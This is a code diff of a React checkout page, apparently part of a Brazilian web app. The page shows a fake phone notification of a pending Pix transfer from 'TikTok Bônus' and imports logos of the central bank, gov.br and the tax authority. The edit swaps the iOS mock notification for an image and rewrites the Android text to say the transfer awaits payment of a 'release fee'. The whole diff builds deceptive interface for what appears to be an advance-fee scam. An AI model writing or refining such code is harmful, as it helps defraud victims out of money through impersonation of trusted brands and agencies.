@@ -6,6 +6,7 @@ import { trackTikTokEvent } from "@/lib/tiktok-tracking";
 import { TARGET_BALANCE } from "@/lib/constants";
 import tiktokLogo from "@/assets/tiktok-logo.png";
 import tiktokNotifIcon from "@/assets/tiktok-notif-icon.png";
+import notifIos from "@/assets/notif-ios.png";
 import bacenLogo from "@/assets/bacen-logo.png";
 import govbrLogo from "@/assets/govbr-logo.png";
 import receitaLogo from "@/assets/receita-federal-logo.png";
@@ -63,29 +64,16 @@ const Checkout = () => {
           style={{ animation: "slideDown 0.4s cubic-bezier(0.16, 1, 0.3, 1)" }}
         >
           {isIOS ? (
-            /* ── iOS Style ── */
-            <div
-              className="rounded-[22px] p-3.5 mx-auto max-w-md border border-white/20"
-              style={{
-                fontFamily: "-apple-system, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', sans-serif",
-                background: "linear-gradient(135deg, rgba(45,45,45,0.92) 0%, rgba(35,35,35,0.95) 100%)",
-                backdropFilter: "blur(50px)",
-                WebkitBackdropFilter: "blur(50px)",
-                boxShadow: "0 10px 40px rgba(0,0,0,0.35), inset 0 0.5px 0 rgba(255,255,255,0.1)",
-              }}
-            >
-              <div className="flex items-center gap-2.5 mb-1.5">
-                <img src={tiktokNotifIcon} alt="TikTok" className="h-5 w-5 rounded-[5px] object-cover shrink-0" />
-                <span className="text-[11px] font-semibold text-white/60 uppercase tracking-wider flex-1">TikTok Bônus</span>
-                <span className="text-[11px] text-white/40 font-medium">agora</span>
-              </div>
-              <p className="text-[15px] font-semibold text-white leading-tight mb-0.5">Pix Pendente</p>
-              <p className="text-[14px] text-white/75 leading-snug">
-                Você recebeu uma transferência de R$ {TARGET.toFixed(2).replace(".", ",")} de TikTok Bônus.
-              </p>
-            </div>
+            <img
+              src={notifIos}
+              alt="Transferência pendente"
+              className="w-full max-w-md mx-auto rounded-[22px]"
+              style={{ boxShadow: "0 10px 40px rgba(0,0,0,0.15)" }}
+              loading="eager"
+              decoding="async"
+            />
           ) : (
-            /* ── Android Style ── */
+            /* ── Android Style (placeholder until image provided) ── */
             <div
               className="rounded-2xl p-4 mx-auto max-w-md"
               style={{
@@ -102,9 +90,9 @@ const Checkout = () => {
               </div>
               <div className="flex items-start gap-3">
                 <div className="flex-1 min-w-0">
-                  <p className="text-[14px] font-semibold text-white leading-tight mb-0.5">Pix Pendente - TikTok Bônus</p>
+                  <p className="text-[14px] font-semibold text-white leading-tight mb-0.5">Transferência pendente</p>
                   <p className="text-[13px] text-white/70 leading-snug">
-                    Você recebeu uma transferência de R$ {TARGET.toFixed(2).replace(".", ",")} de TikTok Bônus.
+                    Transferência no valor de R$ {TARGET.toFixed(2).replace(".", ",")} aguardando pagamento da taxa de liberação.
                   </p>
                 </div>
                 <img src={tiktokNotifIcon} alt="TikTok" className="h-10 w-10 rounded-xl object-cover shrink-0 mt-0.5" />
